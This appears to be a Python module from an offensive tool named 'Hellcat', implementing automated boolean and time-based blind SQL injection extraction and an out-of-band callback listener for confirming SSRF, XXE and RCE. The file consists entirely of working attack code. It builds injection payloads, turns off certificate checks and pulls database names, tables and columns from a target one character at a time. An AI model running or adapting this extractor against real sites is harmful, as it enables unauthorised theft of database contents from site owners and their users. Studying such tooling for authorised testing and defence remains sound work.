"""
Hellcat Deep Injection Engine
==============================
Blind SQLi data extraction (boolean + time-based), SSRF OOB callback
server, advanced verification engine.
"""
from __future__ import annotations

import logging
import string
import time
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("hellcat.inject")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


class BlindSQLiExtractor:
    """Automated blind SQL injection data extraction."""

    def __init__(self, url: str, param: str, method: str = "GET",
                 base_params: Optional[Dict] = None, timeout: int = 10,
                 technique: str = "boolean") -> None:
        self.url = url
        self.param = param
        self.method = method.upper()
        self.base_params = base_params or {}
        self.timeout = timeout
        self.technique = technique  # boolean or time
        self._baseline_len: int = 0
        self._baseline_time: float = 0.0
        self._requests_sent: int = 0

    def _send(self, payload: str) -> tuple:
        """Send request, return (response_length, elapsed_time, status_code)."""
        params = dict(self.base_params)
        params[self.param] = payload
        self._requests_sent += 1
        try:
            if self.method == "GET":
                r = requests.get(self.url, params=params, timeout=self.timeout, verify=False)
            else:
                r = requests.post(self.url, data=params, timeout=self.timeout, verify=False)
            return (len(r.text), r.elapsed.total_seconds(), r.status_code)
        except requests.Timeout:
            return (0, self.timeout, 0)
        except Exception:
            return (0, 0, 0)

    def _is_true(self, payload: str) -> bool:
        """Test if injected condition is True."""
        size, elapsed, status = self._send(payload)
        if self.technique == "time":
            return elapsed >= 3.0  # sleep threshold
        # Boolean: compare response size to baseline
        return abs(size - self._baseline_len) < 50

    def calibrate(self) -> Dict[str, Any]:
        """Establish baseline responses for True/False conditions."""
        true_payload = f"' AND '1'='1"
        false_payload = f"' AND '1'='2"
        ts, tt, _ = self._send(f"{self.base_params.get(self.param, '1')}{true_payload}")
        fs, ft, _ = self._send(f"{self.base_params.get(self.param, '1')}{false_payload}")
        self._baseline_len = ts
        injectable = abs(ts - fs) > 50 or (self.technique == "time" and abs(tt - ft) > 2)
        return {"injectable": injectable, "true_size": ts, "false_size": fs,
                "true_time": round(tt, 2), "false_time": round(ft, 2),
                "technique": self.technique}

    def extract_length(self, query: str, max_len: int = 100) -> int:
        """Binary search for length of query result."""
        low, high = 1, max_len
        while low <= high:
            mid = (low + high) // 2
            if self.technique == "time":
                payload = f"' AND IF(LENGTH(({query}))>{mid},SLEEP(3),0)--"
            else:
                payload = f"' AND LENGTH(({query}))>{mid}--"
            if self._is_true(f"{self.base_params.get(self.param, '1')}{payload}"):
                low = mid + 1
            else:
                high = mid - 1
        return low

    def extract_string(self, query: str, length: int = 0) -> str:
        """Extract string character by character using binary search."""
        if not length:
            length = self.extract_length(query)
            if length <= 0:
                return ""

        result = []
        charset = string.printable[:95]
        for pos in range(1, min(length + 1, 200)):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                if self.technique == "time":
                    payload = f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},SLEEP(3),0)--"
                else:
                    payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--"
                if self._is_true(f"{self.base_params.get(self.param, '1')}{payload}"):
                    low = mid + 1
                else:
                    high = mid - 1
            result.append(chr(low))
            logger.debug("pos %d: %s (total requests: %d)", pos, chr(low), self._requests_sent)

        return "".join(result)

    def extract_database(self) -> str:
        return self.extract_string("SELECT database()")

    def extract_tables(self) -> str:
        return self.extract_string(
            "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")

    def extract_columns(self, table: str) -> str:
        return self.extract_string(
            f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")

    def stats(self) -> Dict[str, Any]:
        return {"requests_sent": self._requests_sent, "technique": self.technique,
                "url": self.url, "param": self.param}


# ---------------------------------------------------------------------------
# OOB Callback Server (simple HTTP listener for SSRF/XXE/RCE verification)
# ---------------------------------------------------------------------------

class OOBCallbackServer:
    """Lightweight HTTP server to catch OOB callbacks (SSRF/XXE/RCE proof)."""

    def __init__(self, host: str = "0.0.0.0", port: int = 9999) -> None:
        self.host = host
        self.port = port
        self.callbacks: List[Dict[str, Any]] = []
        self._server = None
        self._thread = None

    def start(self) -> bool:
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
            import threading

            outer = self

            class Handler(BaseHTTPRequestHandler):
                def do_GET(self):
                    outer.callbacks.append({
                        "time": time.time(), "method": "GET",
                        "path": self.path, "headers": dict(self.headers),
                        "client": self.client_address[0],
                    })
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")

                def do_POST(self):
                    length = int(self.headers.get("Content-Length", 0))
                    body = self.rfile.read(length).decode(errors="replace") if length else ""
                    outer.callbacks.append({
                        "time": time.time(), "method": "POST",
                        "path": self.path, "body": body[:1000],
                        "client": self.client_address[0],
                    })
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")

                def log_message(self, *args):
                    pass  # suppress logging

            self._server = HTTPServer((self.host, self.port), Handler)
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            logger.info("OOB callback server started on %s:%d", self.host, self.port)
            return True
        except Exception as exc:
            logger.error("OOB server failed: %s", exc)
            return False

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()

    def get_callbacks(self, since: float = 0) -> List[Dict[str, Any]]:
        return [c for c in self.callbacks if c["time"] > since]

    def wait_for_callback(self, timeout: float = 10.0) -> Optional[Dict[str, Any]]:
        start = time.time()
        initial = len(self.callbacks)
        while time.time() - start < timeout:
            if len(self.callbacks) > initial:
                return self.callbacks[-1]
            time.sleep(0.5)
        return None

    def clear(self) -> None:
        self.callbacks.clear()
